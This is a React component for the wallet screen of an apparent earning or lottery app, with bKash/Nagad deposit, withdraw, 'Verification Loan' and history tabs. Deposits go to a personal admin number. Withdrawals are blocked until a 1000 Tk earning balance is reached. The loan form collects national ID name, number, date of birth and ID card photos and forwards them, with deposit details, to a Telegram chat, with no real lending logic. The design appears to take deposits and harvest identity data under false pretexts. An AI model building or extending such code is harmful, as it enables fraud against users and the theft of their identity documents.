
import React, { useState, useRef } from 'react';
import { User, HistoryItem } from '../../types';
import { APP_CONFIG } from '../../constants';
import { sendTelegramMessage } from '../../services/telegramService';

interface WalletViewProps {
  user: User;
  updateUser: (updates: Partial<User> | ((prev: User) => Partial<User>)) => void;
}

type WalletTab = 'deposit' | 'withdraw' | 'loan' | 'history';

const WalletView: React.FC<WalletViewProps> = ({ user, updateUser }) => {
  const [activeTab, setActiveTab] = useState<WalletTab>('deposit');
  
  // Animation States
  const [isShaking, setIsShaking] = useState(false);
  const [showModal, setShowModal] = useState<{ type: 'success' | 'error', message: string, subMessage?: string } | null>(null);

  // Deposit States
  const [depositMethod, setDepositMethod] = useState<'bkash' | 'nagad'>('bkash');
  const [depositAmount, setDepositAmount] = useState('');
  const [senderPhone, setSenderPhone] = useState('');
  const [trxID, setTrxID] = useState('');
  
  // Withdraw States
  const [withdrawMethod, setWithdrawMethod] = useState<'bkash' | 'nagad'>('bkash');
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [withdrawNumber, setWithdrawNumber] = useState('');

  // Loan States (New NID Fields)
  const [loanAmount, setLoanAmount] = useState('');
  const [nidName, setNidName] = useState('');
  const [nidNumber, setNidNumber] = useState('');
  const [dob, setDob] = useState('');
  const [nidFront, setNidFront] = useState<File | null>(null);
  const [nidBack, setNidBack] = useState<File | null>(null);

  const adminNumber = depositMethod === 'bkash' ? APP_CONFIG.BKASH_NUMBER : APP_CONFIG.NAGAD_NUMBER;

  // --- Handlers ---

  const handleCopyNumber = () => {
    navigator.clipboard.writeText(adminNumber);
    // Simple toast could go here
  };

  const triggerShake = () => {
    setIsShaking(true);
    setTimeout(() => setIsShaking(false), 500);
  };

  const handleDepositSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (Number(depositAmount) < 100) {
      setShowModal({ type: 'error', message: 'Minimum deposit 100 Tk' });
      return;
    }

    const newTx: HistoryItem = {
      id: Date.now().toString(),
      type: 'Deposit',
      amount: Number(depositAmount),
      date: new Date().toLocaleDateString('en-GB'),
      status: 'Pending',
      method: depositMethod
    };
    
    updateUser((prev) => ({ 
      history: [newTx, ...(prev.history || [])] 
    }));

    const msg = `💰 *New 3D Wallet Deposit*\n\n👤 User: ${user.name} (ID: ${user.id})\n💵 Amount: ${depositAmount} Tk\n📱 Sender: ${senderPhone}\nMethod: ${depositMethod}\n🧾 TrxID: \`${trxID}\``;
    sendTelegramMessage(msg);
    
    setShowModal({ type: 'success', message: 'Deposit Request Sent!', subMessage: 'Please wait for admin approval.' });
    setDepositAmount('');
    setSenderPhone('');
    setTrxID('');
  };

  const handleWithdrawSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const amount = Number(withdrawAmount);
    const earningBalance = user.earningBalance || 0;

    // Condition A: Balance < 1000
    if (earningBalance < 1000) {
      triggerShake();
      setShowModal({ 
        type: 'error', 
        message: 'Request Failed!', 
        subMessage: 'Please earn money and add 1000 money.' 
      });
      return;
    }

    // Check if trying to withdraw more than balance (basic validation)
    if (amount > earningBalance) {
      triggerShake();
      setShowModal({ type: 'error', message: 'Insufficient Funds', subMessage: 'You cannot withdraw more than your balance.' });
      return;
    }

    // Condition B: Balance >= 1000 (Success)
    const newTx: HistoryItem = {
      id: Date.now().toString(),
      type: 'Withdraw',
      amount: amount,
      date: new Date().toLocaleDateString('en-GB'),
      status: 'Pending',
      method: withdrawMethod
    };

    updateUser((prev) => ({
      earningBalance: (prev.earningBalance || 0) - amount,
      history: [newTx, ...(prev.history || [])]
    }));

    const msg = `💸 *Withdraw Request*\n\n👤 User: ${user.name} (ID: ${user.id})\n💵 Amount: ${amount} Tk\n📱 Number: ${withdrawNumber}\nMethod: ${withdrawMethod}\n💰 Current Bal: ${earningBalance - amount}`;
    sendTelegramMessage(msg);

    setShowModal({ 
      type: 'success', 
      message: 'Withdraw request successful!', 
      subMessage: 'Please wait 1 hour.' 
    });

    setWithdrawAmount('');
    setWithdrawNumber('');
  };

  const handleLoanSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    if(!nidFront || !nidBack) {
      setShowModal({ type: 'error', message: 'Missing Documents', subMessage: 'Please upload both NID front and back photos.' });
      return;
    }

    const newTx: HistoryItem = {
      id: Date.now().toString(),
      type: 'Loan',
      amount: Number(loanAmount),
      date: new Date().toLocaleDateString('en-GB'),
      status: 'Pending',
      method: 'NID Verification'
    };
    
    updateUser((prev) => ({ 
      history: [newTx, ...(prev.history || [])] 
    }));

    const msg = `📑 *Loan Application*\n👤 User: ${user.name} (${user.id})\n💰 Amount: ${loanAmount}\n\n📋 *NID Details:*\nName: ${nidName}\nNo: ${nidNumber}\nDOB: ${dob}\n\n📷 Photos attached (Simulated)`;
    sendTelegramMessage(msg);

    setShowModal({ 
      type: 'success', 
      message: 'Request successful.', 
      subMessage: 'Please wait 1 hour. Community Team will verify your Account.' 
    });
    
    setLoanAmount('');
    setNidName('');
    setNidNumber('');
    setDob('');
    setNidFront(null);
    setNidBack(null);
  };

  // --- Render Helpers ---

  return (
    <div className="p-4 pb-24 min-h-screen bg-[#0f172a] text-white relative overflow-hidden font-sans">
      
      {/* Background Ambience */}
      <div className="absolute top-0 left-0 w-full h-full pointer-events-none z-0">
          <div className="absolute top-10 right-[-50px] w-[200px] h-[200px] bg-purple-600/30 rounded-full blur-[80px]"></div>
          <div className="absolute bottom-20 left-[-50px] w-[200px] h-[200px] bg-blue-600/30 rounded-full blur-[80px]"></div>
      </div>

      <style>{`
        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          25% { transform: translateX(-10px); }
          75% { transform: translateX(10px); }
        }
        .animate-shake { animation: shake 0.3s ease-in-out; }
        .card-3d {
          background: rgba(255, 255, 255, 0.05);
          backdrop-filter: blur(16px);
          border: 1px solid rgba(255, 255, 255, 0.1);
          box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
          transform-style: preserve-3d;
          transition: transform 0.3s ease;
        }
        .input-3d {
          background: rgba(0, 0, 0, 0.3);
          border: 1px solid rgba(255, 255, 255, 0.1);
          color: white;
          transition: all 0.3s ease;
        }
        .input-3d:focus {
          border-color: #6366f1;
          box-shadow: 0 0 15px rgba(99, 102, 241, 0.3);
          background: rgba(0, 0, 0, 0.5);
        }
        .btn-3d {
          background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%);
          box-shadow: 0 4px 0 #4c1d95, 0 10px 10px rgba(0,0,0,0.2);
          transition: all 0.1s;
        }
        .btn-3d:active {
          transform: translateY(4px);
          box-shadow: 0 0 0 #4c1d95, inset 0 2px 5px rgba(0,0,0,0.2);
        }
        .custom-scrollbar::-webkit-scrollbar {
          width: 4px;
        }
        .custom-scrollbar::-webkit-scrollbar-track {
          background: rgba(255, 255, 255, 0.05);
        }
        .custom-scrollbar::-webkit-scrollbar-thumb {
          background: rgba(255, 255, 255, 0.2);
          border-radius: 4px;
        }
      `}</style>

      {/* 3D Balance Cards */}
      <div className="grid grid-cols-2 gap-4 mb-6 relative z-10">
        <div className="card-3d rounded-2xl p-4 flex flex-col justify-between h-28 bg-gradient-to-br from-indigo-500/20 to-purple-500/20">
          <div className="flex justify-between items-start">
            <div className="w-8 h-8 rounded-full bg-indigo-500/20 flex items-center justify-center">
              <i className="fas fa-wallet text-indigo-300"></i>
            </div>
            <span className="text-[10px] uppercase font-bold tracking-widest text-indigo-200">Deposit</span>
          </div>
          <div>
            <span className="text-2xl font-black text-white tracking-tighter">৳{user.balance.toFixed(0)}</span>
          </div>
        </div>

        <div className="card-3d rounded-2xl p-4 flex flex-col justify-between h-28 bg-gradient-to-br from-emerald-500/20 to-teal-500/20">
          <div className="flex justify-between items-start">
            <div className="w-8 h-8 rounded-full bg-emerald-500/20 flex items-center justify-center">
               <i className="fas fa-coins text-emerald-300"></i>
            </div>
            <span className="text-[10px] uppercase font-bold tracking-widest text-emerald-200">Earnings</span>
          </div>
          <div>
            <span className="text-2xl font-black text-white tracking-tighter">৳{(user.earningBalance || 0).toFixed(0)}</span>
          </div>
        </div>
      </div>

      {/* 3D Navigation Tabs */}
      <div className="flex gap-3 mb-6 relative z-10 overflow-x-auto pb-2">
        {[
          { id: 'deposit', icon: 'fa-arrow-down', label: 'Deposit', color: 'from-blue-500 to-cyan-500' },
          { id: 'withdraw', icon: 'fa-arrow-up', label: 'Withdraw', color: 'from-pink-500 to-rose-500' },
          { id: 'loan', icon: 'fa-handshake', label: 'Loan', color: 'from-amber-400 to-orange-500' },
          { id: 'history', icon: 'fa-history', label: 'History', color: 'from-gray-500 to-slate-500' },
        ].map((tab) => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id as WalletTab)}
            className={`flex-1 min-w-[80px] py-3 rounded-xl flex flex-col items-center gap-1 transition-all duration-300 ${
              activeTab === tab.id 
              ? `bg-gradient-to-r ${tab.color} shadow-lg shadow-${tab.color.split('-')[1]}-500/40 scale-105` 
              : 'bg-white/5 hover:bg-white/10'
            }`}
          >
            <i className={`fas ${tab.icon} ${activeTab === tab.id ? 'text-white' : 'text-gray-400'}`}></i>
            <span className={`text-xs font-bold ${activeTab === tab.id ? 'text-white' : 'text-gray-400'}`}>{tab.label}</span>
          </button>
        ))}
      </div>

      {/* Main Content Area */}
      <div className={`relative z-10 ${isShaking ? 'animate-shake' : ''}`}>
        
        {/* DEPOSIT SECTION */}
        {activeTab === 'deposit' && (
          <div className="card-3d rounded-3xl p-6 animate-in fade-in slide-in-from-bottom-4 duration-500">
            <h2 className="text-xl font-bold mb-4 flex items-center gap-2 text-cyan-300">
              <i className="fas fa-plus-circle"></i> Add Funds
            </h2>
            
            {/* Method Selection */}
            <div className="flex gap-4 mb-6">
               {['bkash', 'nagad'].map((m) => (
                 <div 
                    key={m}
                    onClick={() => setDepositMethod(m as any)}
                    className={`flex-1 p-3 rounded-xl border-2 cursor-pointer transition-all ${
                      depositMethod === m 
                      ? 'border-cyan-400 bg-cyan-400/10 shadow-[0_0_15px_rgba(34,211,238,0.2)]' 
                      : 'border-white/10 opacity-60 hover:opacity-100'
                    }`}
                 >
                   <div className="text-center font-bold uppercase tracking-wider text-sm">{m}</div>
                 </div>
               ))}
            </div>

            {/* Admin Number Display */}
            <div className="bg-black/40 rounded-xl p-4 mb-6 border border-white/5 text-center relative overflow-hidden group">
               <div className="absolute top-0 left-0 w-1 h-full bg-cyan-500"></div>
               <p className="text-xs text-gray-400 mb-1">Send Money To (Personal)</p>
               <h3 className="text-xl font-mono font-bold text-white tracking-wider mb-2">{adminNumber}</h3>
               <button 
                onClick={handleCopyNumber}
                className="text-xs bg-cyan-500/20 text-cyan-300 px-3 py-1 rounded-full border border-cyan-500/30 hover:bg-cyan-500/40 transition-colors"
               >
                 <i className="fas fa-copy mr-1"></i> Copy Number
               </button>
            </div>

            <form onSubmit={handleDepositSubmit} className="space-y-4">
               <div className="space-y-1">
                 <label className="text-xs font-bold text-gray-400 ml-1">Amount</label>
                 <input 
                   type="number" 
                   value={depositAmount}
                   onChange={(e) => setDepositAmount(e.target.value)}
                   placeholder="Min 100 Tk" 
                   className="w-full p-4 rounded-xl input-3d outline-none font-bold placeholder-gray-600"
                 />
               </div>
               <div className="space-y-1">
                 <label className="text-xs font-bold text-gray-400 ml-1">Sender Number</label>
                 <input 
                   type="tel" 
                   value={senderPhone}
                   onChange={(e) => setSenderPhone(e.target.value)}
                   placeholder="017..." 
                   className="w-full p-4 rounded-xl input-3d outline-none font-bold placeholder-gray-600"
                 />
               </div>
               <div className="space-y-1">
                 <label className="text-xs font-bold text-gray-400 ml-1">Transaction ID</label>
                 <input 
                   type="text" 
                   value={trxID}
                   onChange={(e) => setTrxID(e.target.value)}
                   placeholder="TXN123456" 
                   className="w-full p-4 rounded-xl input-3d outline-none font-bold placeholder-gray-600"
                 />
               </div>

               <button className="w-full py-4 rounded-xl btn-3d text-white font-bold text-lg mt-4 flex justify-center items-center gap-2">
                 <span>Confirm Deposit</span>
                 <i className="fas fa-paper-plane"></i>
               </button>
            </form>
          </div>
        )}

        {/* WITHDRAW SECTION */}
        {activeTab === 'withdraw' && (
          <div className="card-3d rounded-3xl p-6 animate-in fade-in slide-in-from-bottom-4 duration-500">
             <h2 className="text-xl font-bold mb-4 flex items-center gap-2 text-rose-300">
              <i className="fas fa-hand-holding-usd"></i> Withdraw
            </h2>

            <div className="bg-rose-500/10 border border-rose-500/20 rounded-xl p-3 mb-6 flex items-center gap-3">
              <div className="w-10 h-10 rounded-full bg-rose-500/20 flex items-center justify-center text-rose-400">
                <i className="fas fa-info"></i>
              </div>
              <p className="text-xs text-rose-200 leading-relaxed">
                Minimum balance required: <span className="font-bold text-white">1000৳</span>
              </p>
            </div>

            {/* Method Selection */}
            <div className="flex gap-4 mb-6">
               {['bkash', 'nagad'].map((m) => (
                 <div 
                    key={m}
                    onClick={() => setWithdrawMethod(m as any)}
                    className={`flex-1 p-3 rounded-xl border-2 cursor-pointer transition-all ${
                      withdrawMethod === m 
                      ? 'border-rose-400 bg-rose-400/10 shadow-[0_0_15px_rgba(251,113,133,0.2)]' 
                      : 'border-white/10 opacity-60 hover:opacity-100'
                    }`}
                 >
                   <div className="text-center font-bold uppercase tracking-wider text-sm">{m}</div>
                 </div>
               ))}
            </div>

            <form onSubmit={handleWithdrawSubmit} className="space-y-4">
              <div className="space-y-1">
                 <label className="text-xs font-bold text-gray-400 ml-1">Amount to Withdraw</label>
                 <input 
                   type="number" 
                   value={withdrawAmount}
                   onChange={(e) => setWithdrawAmount(e.target.value)}
                   placeholder="Enter Amount" 
                   className="w-full p-4 rounded-xl input-3d outline-none font-bold placeholder-gray-600"
                 />
               </div>
               <div className="space-y-1">
                 <label className="text-xs font-bold text-gray-400 ml-1">Your {withdrawMethod} Number</label>
                 <input 
                   type="tel" 
                   value={withdrawNumber}
                   onChange={(e) => setWithdrawNumber(e.target.value)}
                   placeholder="017..." 
                   className="w-full p-4 rounded-xl input-3d outline-none font-bold placeholder-gray-600"
                 />
               </div>

               <button className="w-full py-4 rounded-xl bg-gradient-to-r from-rose-500 to-orange-500 shadow-[0_4px_0_#9f1239] active:translate-y-[4px] active:shadow-none text-white font-bold text-lg mt-4 transition-all">
                 Request Withdraw
               </button>
            </form>
          </div>
        )}

        {/* LOAN SECTION */}
        {activeTab === 'loan' && (
          <div className="card-3d rounded-3xl p-6 animate-in fade-in slide-in-from-bottom-4 duration-500">
            <h2 className="text-xl font-bold mb-1 flex items-center gap-2 text-amber-300">
              <i className="fas fa-file-contract"></i> Verification Loan
            </h2>
            <p className="text-xs text-gray-400 mb-6">Complete NID verification to get instant loan.</p>

            <form onSubmit={handleLoanSubmit} className="space-y-4">
              <div className="space-y-1">
                 <label className="text-xs font-bold text-gray-400 ml-1">Loan Amount</label>
                 <input 
                   type="number" 
                   value={loanAmount}
                   onChange={(e) => setLoanAmount(e.target.value)}
                   placeholder="Max 5000 Tk" 
                   className="w-full p-4 rounded-xl input-3d outline-none font-bold placeholder-gray-600"
                 />
               </div>

               <div className="grid grid-cols-2 gap-3">
                 <div className="space-y-1">
                    <label className="text-xs font-bold text-gray-400 ml-1">NID Name</label>
                    <input 
                      type="text" 
                      value={nidName}
                      onChange={(e) => setNidName(e.target.value)}
                      placeholder="Name on Card" 
                      className="w-full p-3 rounded-xl input-3d outline-none text-sm placeholder-gray-600"
                    />
                 </div>
                 <div className="space-y-1">
                    <label className="text-xs font-bold text-gray-400 ml-1">Date of Birth</label>
                    <input 
                      type="date" 
                      value={dob}
                      onChange={(e) => setDob(e.target.value)}
                      className="w-full p-3 rounded-xl input-3d outline-none text-sm text-gray-400"
                    />
                 </div>
               </div>

               <div className="space-y-1">
                 <label className="text-xs font-bold text-gray-400 ml-1">NID Number</label>
                 <input 
                   type="number" 
                   value={nidNumber}
                   onChange={(e) => setNidNumber(e.target.value)}
                   placeholder="National ID Number" 
                   className="w-full p-4 rounded-xl input-3d outline-none font-bold placeholder-gray-600"
                 />
               </div>

               {/* File Upload UI */}
               <div className="grid grid-cols-2 gap-3 mt-2">
                 <div className="relative">
                   <input 
                     type="file" 
                     id="nidFront" 
                     className="hidden" 
                     accept="image/*"
                     onChange={(e) => setNidFront(e.target.files?.[0] || null)} 
                    />
                   <label htmlFor="nidFront" className={`flex flex-col items-center justify-center h-24 rounded-xl border-2 border-dashed cursor-pointer transition-colors ${nidFront ? 'border-green-400 bg-green-400/10' : 'border-gray-600 bg-black/20 hover:border-amber-400'}`}>
                     <i className={`fas ${nidFront ? 'fa-check-circle text-green-400' : 'fa-id-card text-gray-400'} text-xl mb-1`}></i>
                     <span className="text-[10px] uppercase font-bold text-gray-400">{nidFront ? 'Front Added' : 'NID Front'}</span>
                   </label>
                 </div>
                 <div className="relative">
                   <input 
                     type="file" 
                     id="nidBack" 
                     className="hidden" 
                     accept="image/*"
                     onChange={(e) => setNidBack(e.target.files?.[0] || null)} 
                    />
                   <label htmlFor="nidBack" className={`flex flex-col items-center justify-center h-24 rounded-xl border-2 border-dashed cursor-pointer transition-colors ${nidBack ? 'border-green-400 bg-green-400/10' : 'border-gray-600 bg-black/20 hover:border-amber-400'}`}>
                     <i className={`fas ${nidBack ? 'fa-check-circle text-green-400' : 'fa-id-card text-gray-400'} text-xl mb-1`}></i>
                     <span className="text-[10px] uppercase font-bold text-gray-400">{nidBack ? 'Back Added' : 'NID Back'}</span>
                   </label>
                 </div>
               </div>

               <button className="w-full py-4 rounded-xl btn-3d text-white font-bold text-lg mt-4 flex justify-center items-center gap-2">
                 Submit Application
               </button>
            </form>
          </div>
        )}

        {/* HISTORY SECTION (NEW) */}
        {activeTab === 'history' && (
           <div className="card-3d rounded-3xl p-4 animate-in fade-in slide-in-from-bottom-4 duration-500 h-[60vh] flex flex-col">
             <h2 className="text-xl font-bold mb-4 flex items-center gap-2 text-gray-300">
              <i className="fas fa-history"></i> Transactions
            </h2>
            
            <div className="space-y-3 overflow-y-auto flex-1 pr-1 custom-scrollbar">
               {user.history && user.history.length > 0 ? (
                 user.history.map((item) => (
                   <div key={item.id} className="bg-black/20 p-3 rounded-xl border border-white/5 flex items-center justify-between hover:bg-white/5 transition-colors">
                      <div className="flex items-center gap-3">
                         <div className={`w-10 h-10 rounded-full flex items-center justify-center text-lg shadow-lg ${
                            item.type === 'Deposit' ? 'bg-blue-500/20 text-blue-400' :
                            item.type === 'Withdraw' ? 'bg-red-500/20 text-red-400' :
                            item.type === 'Spin' ? 'bg-purple-500/20 text-purple-400' :
                            item.type === 'Lottery Purchase' ? 'bg-yellow-500/20 text-yellow-400' :
                            item.type === 'Item Sold' ? 'bg-green-500/20 text-green-400' :
                            'bg-gray-500/20 text-gray-400'
                         }`}>
                            <i className={`fas ${
                              item.type === 'Deposit' ? 'fa-arrow-down' :
                              item.type === 'Withdraw' ? 'fa-arrow-up' :
                              item.type === 'Spin' ? 'fa-dharmachakra' :
                              item.type === 'Loan' ? 'fa-handshake' :
                              item.type === 'Lottery Purchase' ? 'fa-ticket-alt' :
                              item.type === 'Item Sold' ? 'fa-tag' :
                              'fa-circle'
                            }`}></i>
                         </div>
                         <div>
                            <div className="font-bold text-sm text-gray-200">{item.type}</div>
                            <div className="text-[10px] text-gray-500 flex items-center gap-1">
                                <span>{item.date}</span>
                                {item.type === 'Spin' && (
                                    <span className={`px-1.5 rounded-[4px] text-[9px] ${item.method === 'Free Spin' ? 'bg-green-500/20 text-green-400' : 'bg-yellow-500/20 text-yellow-400'}`}>
                                        {item.method}
                                    </span>
                                )}
                            </div>
                         </div>
                      </div>
                      <div className={`font-bold ${
                         ['Deposit', 'Loan', 'Spin', 'Lottery Win', 'Item Sold', 'Daily Profit'].includes(item.type) 
                         ? 'text-green-400' 
                         : item.type === 'Spin' && item.amount > 0 ? 'text-green-400'
                         : 'text-white'
                      }`}>
                         {['Withdraw', 'Lottery Purchase', 'Delivery Fee', 'Trade Buy', 'Game TopUp'].includes(item.type) ? '-' : '+'}
                         ৳{item.amount}
                      </div>
                   </div>
                 ))
               ) : (
                 <div className="flex flex-col items-center justify-center h-full text-gray-500 opacity-60">
                   <i className="fas fa-file-invoice text-4xl mb-2"></i>
                   <p className="text-xs">No transactions yet</p>
                 </div>
               )}
            </div>
           </div>
        )}

      </div>

      {/* MODAL SYSTEM */}
      {showModal && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-200">
          <div className="bg-[#1e293b] rounded-2xl p-6 w-full max-w-xs text-center border border-white/10 shadow-2xl relative overflow-hidden">
             {/* Glow Effect */}
             <div className={`absolute top-0 left-0 w-full h-1 ${showModal.type === 'success' ? 'bg-green-500' : 'bg-red-500'}`}></div>
             
             <div className={`w-16 h-16 rounded-full mx-auto mb-4 flex items-center justify-center text-3xl ${
               showModal.type === 'success' ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'
             }`}>
               <i className={`fas ${showModal.type === 'success' ? 'fa-check' : 'fa-times'}`}></i>
             </div>

             <h3 className="text-xl font-bold text-white mb-2">{showModal.message}</h3>
             {showModal.subMessage && <p className="text-sm text-gray-400 mb-6">{showModal.subMessage}</p>}

             <button 
               onClick={() => setShowModal(null)}
               className="w-full py-3 rounded-xl bg-white/10 hover:bg-white/20 text-white font-bold transition-colors"
             >
               Close
             </button>
          </div>
        </div>
      )}

    </div>
  );
};

export default WalletView;
